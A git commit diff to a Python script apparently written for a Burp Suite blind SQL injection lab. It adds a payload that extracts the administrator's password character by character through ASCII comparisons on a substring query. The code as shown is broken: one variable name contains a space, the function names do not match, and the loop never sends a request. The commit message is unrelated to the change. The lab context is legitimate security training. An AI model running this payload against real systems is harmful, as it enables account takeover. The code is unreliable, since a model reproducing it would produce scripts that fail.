1c55829b80c8994557f6b0ad657b5c1b54ce5981
Sab <130924535+yabbing@users.noreply.github.com>
2026-01-05 18:20:25 -0500

    switch to vs

--- Burpsuite-labs/sql-lab-11-blindsql.py
+++ Burpsuite-labs/sql-lab-11-blindsql.py
@@ -10,11 +10,14 @@ def sqki_password(url):
    password = ""
    for i in range(1, 21):
       for j in range (32,126):
+         sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--'" % (i,j)
+         sqli_payload_encoded = urllib.parse.quote(sqli payload)
 
 def main():
    if len(sys.argv) != 2:
       print("(+) Usage: %s <url>" % sys.argv[0])
       print("(+ )Example: %s http://target.com/vulnerable_endpoint" % sys.argv[0])
+
    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)
